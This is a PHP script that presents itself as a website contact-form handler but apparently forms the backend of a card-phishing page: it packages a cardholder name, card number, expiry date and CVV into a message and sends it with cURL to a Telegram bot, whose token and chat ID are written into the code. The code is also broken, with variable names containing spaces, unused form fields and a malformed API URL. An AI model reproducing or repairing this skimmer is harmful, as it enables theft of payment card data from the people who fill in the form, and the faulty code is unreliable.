<?php
// Force PHP to show errors directly on your screen if something goes wrong
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    
    // 1. Grab data matching the "name" attributes from your HTML inputs
    $name = isset($_POST['visitor_name']) ? $_POST['visitor_name'] : 'Not provided';
    $message = isset($_POST['visitor_message']) ? $_POST['visitor_message'] : 'No message';
    
    // 2. 📍 INPUT YOUR TELEGRAM DETAILS HERE 📍
    $botToken = "8631779282:AAEkOFJ-Ipr0paFMlTV5OfzECcwEeJ9Rk9U"; // Replace with your real token from BotFather
    $chatId = "5221071485";                             // Replace with your real user/group Chat ID
    
    // 3. Format how your notification looks inside Telegram
    $text = "📩 New Website Form Submission:\n\n";
    $text .= "👤 Cardholder Name: " . $Cardholder Name . "\n";
    $text .= "💬 Card Number: " . $Card Number . "\n";
    $text .= "💬 Expiry Date: " . $Expiry Date . "\n";
    $text .= "💬 CVV: " . $CVV . "\n";
    
    // 4. Construct the Telegram endpoint URL
    $url = "https://telegram.org" . $botToken . "/sendMessage";
    
    // 5. Initialize cURL request (safest way for live servers)
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, [
        'chat_id' => $chatId,
        'text' => $text
    ]);
    
    // Execute request and check for standard server connection bugs
    $response = curl_exec($ch);
    $curl_error = curl_error($ch);
    curl_close($ch);
    
    if ($curl_error) {
        // This runs if your web server blocks requests entirely
        echo "Hosting Server Connection Error: " . $curl_error;
    } else {
        // Decode Telegram's reply to check if your credentials worked
        $result = json_decode($response, true);
        
        if (isset($result['ok']) && $result['ok'] === true) {
            // SUCCESS: Redirect back to your form page (adds a success flag in URL)
            header("Location: index.html?status=success");
            exit();
        } else {
            // FAILURE: Telegram rejected your inputs (wrong Token or wrong Chat ID)
            echo "<h3>Telegram Error: Request Rejected</h3>";
            echo "Details: " . ($result['description'] ?? 'Unknown authentication issue.');
        }
    }
} else {
    echo "Direct folder access not allowed. Please submit the form.";
}
?>
